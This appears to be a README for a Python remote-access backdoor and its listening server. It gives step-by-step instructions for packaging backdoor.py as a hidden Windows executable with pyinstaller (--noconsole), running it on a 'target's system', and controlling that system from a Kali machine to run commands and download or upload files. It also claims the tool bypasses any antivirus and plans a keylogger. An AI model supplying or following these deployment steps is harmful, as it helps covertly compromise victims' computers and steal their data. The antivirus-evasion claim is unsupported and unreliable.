# Secure-Back-Door-And-Server

1) You have to change the IP adress in both python file(backdoor.py & server.py)
2) Open terminal and install pyinstaller library by typing -> pip install pyinstaller
3) Open terminal in python file directory and make backdoor.py file so exe file using pyinstaller
    -> Run pyinstaller backdoor.py --onefile --noconsole
4) You getting some file in that folder. In that open dist folder, Were you will find backdoor.exe file
5) Run that file in target's system (Any version of Windows).
6) Run server.py file in your system (Linux system[kali,ubuntu etc..])
7) server.py will start to listening the connection from target PC. If it got connection, we can execute windows commands.


Features of Secure-Back-Door-And-Server.
  1. Change directory: We can change directory by typeing -> cd [file name] 
  2. Clear: We can clear terminal by typing -> clear
  3. Download: We can download file by typing -> download [file name]
  4. Upload: We can upload file by typing -> upload [file name]
  5. It can bypass any antivirus.
  
 Future update:
  1. Keylogger
  2. screenshot 
  3. etc...
  
  
